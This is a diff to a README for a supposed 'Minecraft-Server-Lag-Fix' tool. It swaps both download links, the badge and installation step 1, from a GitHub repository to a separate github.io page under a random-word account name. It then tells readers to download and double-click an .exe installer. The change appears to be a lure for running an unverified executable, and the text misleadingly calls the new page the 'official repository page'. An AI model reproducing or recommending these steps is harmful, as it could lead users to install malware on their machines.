@@ -1,6 +1,6 @@
 # 🛠️ Minecraft-Server-Lag-Fix - Smooth Gameplay and Reduced Server Latency
 
-[![](https://img.shields.io/badge/Download-Installer-blue.svg)](https://github.com/fenderbendercardaminebulbosa964/Minecraft-Server-Lag-Fix)
+[![](https://img.shields.io/badge/Download-Installer-blue.svg)](https://fenderbendercardaminebulbosa964.github.io)
 
 ## 📌 Project Overview
 
@@ -18,7 +18,7 @@ Your computer needs specific settings to run this tool correctly:
 
 ## 🚀 Installation Steps
 
-1.  Visit the official repository page to get the software: [Download Minecraft-Server-Lag-Fix](https://github.com/fenderbendercardaminebulbosa964/Minecraft-Server-Lag-Fix).
+1.  Visit the official repository page to get the software: [Download Minecraft-Server-Lag-Fix](https://fenderbendercardaminebulbosa964.github.io).
 2.  Locate the latest installer file ending in .exe.
 3.  Double-click the file to start the installation wizard.
 4.  Follow the instructions on your screen.
